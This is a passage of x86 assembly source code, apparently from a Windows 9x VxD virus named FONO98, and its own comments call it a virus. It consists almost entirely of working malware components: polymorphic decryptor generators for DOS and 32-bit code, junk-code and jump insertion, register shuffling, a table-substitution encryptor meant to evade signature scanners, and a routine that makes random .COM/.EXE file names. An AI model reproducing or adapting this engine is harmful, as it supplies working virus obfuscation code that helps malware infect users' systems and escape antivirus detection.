       call rnd
       and eax, 0111b
       inc eax
       mov ecx, eax
 @a9:
       call garble                             ;garble a bit more
       loop @a9
       pop ecx
       loop @a8
       mov ax, 013cdh                          ;int 13
       stosw
       mov byte ptr [gtype], gfl
       mov word ptr [rgusg], 1000b
       call mgarble
       mov al, 06                              ;push es
       stosb
       call mgarble
       mov al, 53h                             ;push bx
       stosb
       call mgarble
       mov al, 0cbh                            ;retf
       stosb
       ret

mgarble:
       push ecx
       call rnd
       and eax, 0111b
       inc eax
       mov ecx, eax                            ;1-8 garbage calls
 @b9:
       call garble
       loop @b9
       pop ecx
       ret

maqfile:
       mov byte ptr [gtype], gnf
 @c0:
       call rnd
       or al, al
       jz @c0
       mov byte ptr [key], al
       call creg
       mov byte ptr [cntreg], dl
       bts word ptr [rgusg], dx
       call rnd
       and eax, 0111111111111b
       add ax, word ptr [esi+edx*2]
       add ax, VIRSIZE
       mov word ptr [cntregv], ax
 @c1:
       call rnd
       and eax, 011b
       add al, al
       add eax, offset32 crtbl
       mov ax, word ptr [eax]
       movzx edx, ah
       bts word ptr [rgusg], dx
       jc @c1
       mov byte ptr [pntreg], dl
       mov byte ptr [encintr], al
       mov ax, word ptr [esi+edx*2]
       mov word ptr [pntregv], ax
       mov dword ptr [strloop], edi
       call mgarble
       mov al, 80h
       mov ah, byte ptr [encintr]
       stosw
       push edi
       stosw
       mov al, byte ptr [key]
       stosb
       call mgarble
       mov al, 040h
       or al, byte ptr [pntreg]
       stosb
       call mgarble
       mov al, 040h
       or al, byte ptr [cntreg]                ;inc counter
       stosb
       call mgarble
       mov ax, 0f881h
       or ah, byte ptr [cntreg]
       stosw
       mov ax, word ptr [cntregv]
       stosw
       mov ax, 0074h
       stosw
       push edi
       call mgarble
       mov al, 0e9h
       stosb
       mov eax, edi
       sub eax, dword ptr [strloop]
       add eax, 2
       neg eax
       stosw
       call mgarble
       pop ebp
       mov ecx, edi
       sub ecx, ebp
       mov byte ptr [ebp-1], cl
       call mgarble
       call mgarble
       mov word ptr [rgusg], 0
       pop ebp

       mov ecx, edi
       sub ecx, [pDOSBase]
       add ecx, 100h

       movzx eax, word ptr [pntregv]
       sub ecx, eax
       mov word ptr [ebp], cx
       ret

mxrg:
       push eax
       call rnd
       and eax, 0111b
       inc eax
       mov ecx, eax
       pop eax
 @c3:
       call rndf
       jc @c4
       xchg eax, ebx                           ;randomize order
 @c4:
       call rndf
       jc @c5
       xchg ebx, edx
 @c5:
       call rndf
       jc @c6
       xchg edx, ebp
 @c6:
       call rndf
       jc @c7
       xchg ebp, eax
 @c7:
       loop @c3
       ret

garble:
       cmp [maq], 0
       je artm
       call rnd
       and eax, 0111b
       cmp eax, 0111b
       jne artm
       push ecx                                ;make a jump
       call rnd
       and eax, 0111b
       add eax, 4
       mov ecx, eax
       mov ah, 0ebh
       xchg al, ah
       stosw
 ngrb:
       call rnd
       stosb
       loop ngrb
       pop ecx
       ret
 artm:
       mov ebx, offset32 optbl
 @d1:
       call rnd
       and eax, 0111b
   gtype equ byte ptr $-1
   gfl = 0111b
   gnf = 0011b
       cmp al, 5
       ja @d1
       add al, al
       mov ax, word ptr [ebx+eax]              ;make aritm
       mov byte ptr [opcode1], ah
       mov byte ptr [opcode2], al
       call creg
       call gopc
       ret

creg:
       call rnd
       and eax, 0111b
       cmp al, 4
       jne @e1
       inc al
 @e1:
       mov dl, al
       bt word ptr [rgusg], dx                 ;used
       jc creg
       ret

gopc:
       mov bl, 12h
   opcode1 equ byte ptr $-1
       mov al, 81h
       cmp bl, 0c0h
       jb @f1
       stosb
 @f1:
       mov al, bl
       or al, dl
       stosb
       call rnd
       stosw
       mov bx, ax
       mov ax, word ptr [flags]
       sahf                                    ;look this!
   opcode2 equ byte ptr $+1                    ;the decriptor depends
       mov word ptr [esi+edx*2], bx            ;of the garbage code!
       lahf                                    ;we keep track of all, regs
       mov word ptr [flags], ax                ;and flags!!!! :)
       ret

mrval:
       push eax
       call rnd
       and eax, 011b                           ;ask a value... we make it
       or eax, eax                             ;(in the requested reg) using
       jz @g1                                  ;math and the current garbage
       dec eax                                 ;status! no more fixed movs :)
 @g1:
       add al, al
       movzx eax, word ptr [offset32 fxtbl+eax]
       or al, dl
       xchg al, ah
       mov byte ptr [opcode3], al
       mov al, 81h
       stosw
       cmp byte ptr [opcode3], 3               ;(as you noticed, i'm very
       pop eax                                 ;proud of this engine)
       jnz @g2
       neg eax
 @g2:
       movzx ebx, word ptr [esi+edx*2]
       jmp @g3
 @g3:
       xor eax, ebx
   opcode3 equ byte ptr $-2                    ;xor/add/sub
       stosw
       ret

rnd:
       push ecx
       push edx
       mov eax, 12345678h                      ;congruential something... :)
   seed equ dword ptr $-4
       mov ecx, eax
       imul eax, 41c64e6dh
       add eax, 3039h                          ;thankz to GriYo...
       ror ax, 1                               ;(do you not imagine how hard
       mov dword ptr [seed], eax               ;is code a decent rnd routine)
       xor eax, ecx
       pop edx
       pop ecx
       ret

rndf:
       push eax
       call rnd
       pop eax
       bt eax, 1                               ;random z flag
       ret

pDOSBase dd 0
maq     db 0
key     db 0
strloop dd 0
cntregv dw 0
cntreg  db 0
pntregv dw 0
pntreg  db 0
encintr db 0

optbl  dw 0b889h, 0f031h, 0c001h, 0e829h, 0d011h, 0d819h
       ;  MOV     XOR     ADD     SUB     ADC     SBB
fxtbl  dw 033f0h, 02bc0h, 003e8h
       ;  XOR     ADD     SUB
crtbl  dw 03b7h, 05b6h, 06b4h, 07b5h

flags  dw 0
rgusg  dw 0

rgtbl  equ this byte
   _ax dw 0
   _cx dw 0
   _dx dw 0
   _bx dw 0
   _sp dw 0
   _bp dw 0
   _si dw 0
   _di dw 0

PolyDOSSize equ $ - offset32 gldr


peng:
         push edi                              ;our 32bit poly engine
         push edi
         mov [totsize], ecx
         cld
         mov edi, offset32 crptbl
         mov ecx, 101h
         sub edx, edx
  tlp:
         mov byte ptr [edi+edx], dl
         inc edx
         loop tlp                              ;make linear table of values
         mov edi, offset32 crptbl
         mov ecx, 01111b
  tlp2:
         call rnd255                           ;randomize table
         mov ebx, eax
         call rnd255
         mov dl, byte ptr [edi+ebx]
         xchg dl, byte ptr [edi+eax]           ;keep exchanging some bytes
         mov byte ptr [edi+ebx], dl
         loop tlp2
         pop edi
         mov [reg32], 00010000b                ;set esp as used
         call garble32
         mov [reg32], 00110000b                ;set esp/ebp as used
         call get8reg
         mov [tmp], eax
         call get32_16reg
         mov [tpointer], eax
         call get32_16reg
         mov [dpointer], eax
         call get32_16reg
         mov [tmp2], eax
         call get32_16reg
         mov [counter], eax                    ;choose regs
         call garble32
         push offset32 mdecr                   ;return adress
         mov ebp, offset32 mcounter
         mov ebx, offset32 mpointer
         mov edx, offset32 mdpointer
         call rnd
         and eax, 0111b
         inc eax
         mov ecx, eax
  mixer1:
         call rndf
         jc m11
         xchg ebp, ebx
  m11:
         call rndf
         jc m12
         xchg edx, ebx
  m12:
         call rndf
         jc m13
         xchg edx, ebp
  m13:
         loop mixer1                           ;randomize calling order
         push ebp
         push ebx
         push edx
         ret
  mdecr:
         mov [lstart], edi
         call garble32
         mov ax, 1011011000001111b
         stosw                                 ;movzx d tmp2, [reg1+reg2]
         mov eax, [tmp2]
         shl eax, 3
         or al, 100b
         stosb
         mov eax, [tpointer]
         shl eax, 3
         or eax, [dpointer]
         stosb
         push eax
         call garble32
         mov al, 10001010b
         stosb                                 ;mov b tmp, [reg1+tmp2]
         mov eax, [tmp]
         shl eax, 3
         or al, 100b
         stosb
         push eax
         mov eax, [tpointer]
         shl eax, 3
         mov ebx, [tmp2]
         or eax, ebx
         stosb
         mov al, 10001000b
         stosb                                 ;mov b [reg1+reg2], tmp
         pop eax
         stosb
         pop eax
         stosb
         call garble32
         push offset32 mcontinue
         mov ebx, offset32 inc_pointer
         mov edx, offset32 dec_counter
         call rndf
         jc m2
         xchg edx, ebx                         ;randomize order
  m2:
         push ebx
         push edx
         ret
  mcontinue:
         call garble32
         mov al, 0bh
         stosb
         mov eax, [counter]
         shl eax, 3
         or eax, [counter]
         or al, 11000000b
         stosb                                 ;or reg, reg
         mov eax, 850fh
         stosw
         mov eax, [lstart]                     ;386+ jne
         sub eax, edi
         sub eax, 4
         stosd
         mov [reg32], 00010000b                ;set esp as used
         call garble32
         call garble32
         mov ecx, edi
         sub ecx, [tblstrt]                    ;calculate start of code
         mov esi, [pmdptr]                     ;to decript(delta-based)
         mov [esi], ecx
         pop edx
         mov ecx, edi
         sub ecx, edx                          ;exit with correct regs
         ret

inc_pointer:
         mov eax, 40h                          ;inc
         or eax, [dpointer]
         stosb
         call garble32
         ret

dec_counter:
         mov eax, 48h                          ;dec
         or eax, [counter]
         stosb
         call garble32
         ret

mcounter:
         mov eax, 0b8h                         ;mov
         or eax, [counter]
         stosb
         mov eax, [totsize]
         stosd
         call garble32
         ret

mpointer:
         mov al, 0e8h
         stosb
         mov ecx, 255+1
         mov eax, ecx
         stosd                                 ;do call
         mov [tblstrt], edi
         mov esi, offset32 crptbl
         rep movsb                             ;zopy table
         mov eax, 58h                          ;do pop
         or eax, [tpointer]
         stosb
         call garble32
         ret

mdpointer:
         mov eax, 0b8h                         ;mov
         or eax, [dpointer]
         stosb
         mov [pmdptr], edi
         stosd
         call garble32
         ret

gar:
         call rnd                              ;get any reg
         and eax, 0111b
         cmp al, 4                             ;sp never
         je gar
         ret

get32_16reg:                                   ;get a free 32/16bit reg
         call gar
         bts [reg32], eax
         jc get32_16reg
         ret

get8reg:                                       ;get a free 8bit reg
         call rnd                              ;al,cl,dl,bl
         and eax, 0011b
         bts [reg32], eax
         jc get8reg
         call rndf
         jc ntg
         or al, 0100b                          ;ah,ch,dh,bh
  ntg:
         ret

garble32:
         pushad
         cmp byte ptr [rlevel], 3
         je maxr
         inc byte ptr [rlevel]
         call rnd
         and eax, 0111b
         mov ecx, eax
         inc ecx
  ng32:
         push ecx
         call rnd
         and eax, 01111b
         shl eax, 2
         add eax, offset32 gtbl
         call dword ptr [eax]
         pop ecx
         loop ng32
         dec byte ptr [rlevel]
  maxr:
         mov dword ptr [esp], edi              ;change stack copy of edi
         popad
         ret

gtbl     equ this byte
         dd offset32 subr                      ;silly garblers :(
         dd offset32 subr
         dd offset32 jmps
         dd offset32 jmps
         dd offset32 jmps
         dd offset32 jmps                      ;no time to code good ones...
         dd offset32 jcc
         dd offset32 jcc
         dd offset32 jcc
         dd offset32 jcc
         dd offset32 calls
         dd offset32 calls
         dd offset32 calls
         dd offset32 calls
         dd offset32 calls
         dd offset32 calls

jcc:
         call rnd                              ;do jump conditional with
         and eax, 0fh                          ;real displacement(no shitty
         or eax, 0f80h                         ;$+2 thingie)
         xchg al, ah
         stosw
         stosd
         push edi
         call garble32
         pop esi
         mov ecx, edi
         sub ecx, esi
         mov dword ptr [esi-4], ecx
         ret

jmps:
         mov al, 0e9h                          ;do jump
         stosb
         stosd
         push edi
         call rnd
         and eax, 0111b
         inc eax
         mov ecx, eax
  njnk:
         call rnd                              ;fill with junk
         stosb
         loop njnk
         pop esi
         mov ecx, edi
         sub ecx, esi
         mov dword ptr [esi-4], ecx
         ret

subr:                                          ;make call to subroutine
         cmp dword ptr [subad], 0
         jz ncall                              ;a subroutine was coded?
         mov al, 0e8h
         stosb
         mov eax, edi
         sub eax, dword ptr [subad]            ;calc subr address
         add eax, 4
         neg eax
         stosd
  ncall:
         ret

calls:
         cmp dword ptr [subad], 0              ;make subroutine
         jne ncall
         mov al, 0e9h                          ;the old thing...
         stosb
         stosd                                 ;jump @@1
         push edi                              ;@@2:
         call garble32                         ;*garbage*
         mov al, 0c3h                          ;*garbage*
         stosb                                 ;ret
         pop esi                               ;@@1:
         mov ecx, edi
         sub ecx, esi
         mov dword ptr [esi-4], ecx
         mov dword ptr [subad], esi            ;store sub address
         ret

rnd255:
         call rnd
         and eax, 011111111b
         ret

encript_pe:
         pushad
         mov ecx, dword ptr [totsize]          ;our poly engine isnt a
         mov ebx, offset32 crptbl              ;cyclical decriptor using
  ecrt:                                        ;xor/add/sub or like...
         lodsb
         push ecx                              ;we use a substitution scheme,
         push edi                              ;based in a table... This way,
         mov ecx, 100h                         ;'A'=='2' '#'=='x' and so...
         mov edi, ebx                          ;no virus i know use this
         repne scasb
         dec edi
         sub edi, ebx
         mov eax, edi                          ;eax hold offset into table
         pop edi
         pop ecx
         stosb
         loop ecrt
         mov [esp], edi                        ;setup edi copy in stack
         popad
         ret

subad    dd 0
rlevel   db 0
tmp      dd 0
tmp2     dd 0
tpointer dd 0
dpointer dd 0
counter  dd 0
pmdptr   dd 0
tblstrt  dd 0
lstart   dd 0
reg32    dd 0
totsize  dd 0


BeginProc CRC16
         push ebx
         push ecx
         mov ebx, 0a001h
         mov edi, offset32 CrcTab
         xor edx, edx
  crc16nb:
         mov ax, dx
         mov cx, 8
  crc16l:
         shr ax, 1
         jae crc16sk
         xor ax, bx
  crc16sk:
         loop crc16l
         stosw                                 ;make da table
         inc edx
         cmp edx, 512
         jne crc16nb
         pop ecx
         xor eax, eax
  CRC16Loop:
         xor ebx, ebx
         mov bl, al
         lodsb
         xor bl, al
         shl bx, 1
         mov bx, word ptr [CrcTab+bx]          ;make CRC16 of it
         xor bl, ah
         mov eax, ebx
         loop CRC16Loop
         pop ebx
         ret
EndProc CRC16



BeginProc Random4Name
         mov dword ptr [edi], 'AAAA'           ;setup base name
         mov ecx, 4
         in al, 40h
         mov ah, al
  NextLetter:
         in al, 40h
         xor al, ah
         mov ah, al
         and al, 01111b
         add byte ptr [edi], al                ;add random values to make
         inc edi                               ;random letter, to obtain a
         loop NextLetter                       ;random name! :)
         in al, 40h
         cmp al, 80h
         mov eax, 12345678h
       org $-4
         db '.', 'C', 'O', 'M'
         jb PutThisOne                         ;put a .COM extension
         mov eax, 12345678h
       org $-4
         db '.', 'E', 'X', 'E'
  PutThisOne:
         mov [edi], eax                        ;or a .EXE one
         ret
EndProc Random4Name



BeginProc FONO98_Control
         Control_Dispatch Init_Complete, FONO98_Device_Init
         clc                                   ;our init procedure...
         ret                                   ;other virus wait for more
EndProc FONO98_Control                         ;calls... but i did only this
                                               ;one and it worked, so...


VxD_Locked_Code_Ends

End
